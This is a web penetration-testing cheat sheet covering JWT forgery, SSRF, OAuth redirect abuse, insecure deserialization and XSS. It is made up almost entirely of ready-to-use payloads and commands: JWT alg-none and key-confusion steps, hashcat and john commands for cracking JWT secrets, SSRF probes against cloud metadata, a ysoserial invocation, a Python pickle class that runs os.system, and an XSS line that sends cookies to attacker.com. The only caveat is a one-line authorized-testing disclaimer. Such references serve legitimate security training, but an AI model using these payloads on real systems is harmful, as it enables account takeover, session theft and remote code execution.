# Web Deep Dive – JWT, SSRF, OAuth, Deserialization
**Author: Manish Verma**

---

## JWT Attacks

### Algorithm None Attack
```
1. Decode JWT: base64decode(header.payload.signature)
2. Change "alg": "HS256" → "alg": "none"
3. Remove signature
4. Send: header.payload.
```

### Key Confusion (RS256 → HS256)
```
1. Get server's public key
2. Sign token with HS256 using public key as secret
3. Server verifies HS256 with public key (same as secret used)
```

### Weak Secret Brute Force
```bash
hashcat -m 16500 jwt_token.txt wordlist.txt
john --wordlist=rockyou.txt --format=HMAC-SHA256 jwt.txt
```

---

## SSRF (Server-Side Request Forgery)

### Basic SSRF
```
Vulnerable parameter: ?url=, ?redirect=, ?fetch=, ?proxy=
Test: ?url=http://127.0.0.1
Test: ?url=http://169.254.169.254/latest/meta-data/   (AWS metadata)
Test: ?url=http://192.168.1.1   (internal network)
```

### SSRF Bypasses
```
http://127.0.0.1 → http://0x7f000001
http://127.0.0.1 → http://2130706433
http://localhost → http://localtest.me
Redirect: http://attacker.com → 302 to http://127.0.0.1
DNS rebinding attacks
```

---

## OAuth Flaws

### State Parameter Missing (CSRF)
```
No state param → Attacker can force victim to authorize attacker's account
```

### Redirect URI Manipulation
```
?redirect_uri=https://attacker.com
?redirect_uri=https://legit.com@attacker.com
?redirect_uri=https://legit.com/../attacker.com
```

### Token Leakage via Referer
```
Access token in URL → sent in Referer header to third-party scripts
```

---

## Deserialization

### Java Deserialization
```bash
# ysoserial for gadget chains
java -jar ysoserial.jar CommonsCollections1 "command" | base64

# Check for: rO0 in base64 (Java serialized object header)
```

### PHP Deserialization
```php
# Craft malicious serialized object
O:4:"User":1:{s:4:"role";s:5:"admin";}
# Look for __wakeup(), __destruct() magic methods
```

### Python Pickle
```python
import pickle, os
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))
pickle.dumps(Exploit())
```

---

## XSS Master Reference

```javascript
// Basic
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

// Cookie theft
<script>fetch('http://attacker.com/?c='+document.cookie)</script>

// Bypass filters
<sCrIpT>alert(1)</sCrIpT>
<script>eval(atob('YWxlcnQoMSk='))</script>
```

---

## ⚠️ Disclaimer
All techniques for authorized testing only.
